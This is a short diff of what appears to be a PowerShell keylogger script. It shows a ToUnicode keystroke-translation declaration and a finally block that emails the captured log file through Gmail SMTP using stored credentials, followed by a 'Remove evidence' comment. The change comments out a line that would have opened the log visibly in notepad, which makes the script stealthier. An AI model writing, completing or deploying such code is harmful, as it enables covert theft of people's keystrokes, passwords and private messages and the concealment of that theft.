@@ -83,7 +83,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
   # send logs if code fails
   finally {
-    notepad $logFile
+    # notepad $logFile
     # Send mail
     Send-MailMessage -From $From -To $To -Subject $Subject -Body (Get-Content -Path $logFile) -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
     # Remove evidence
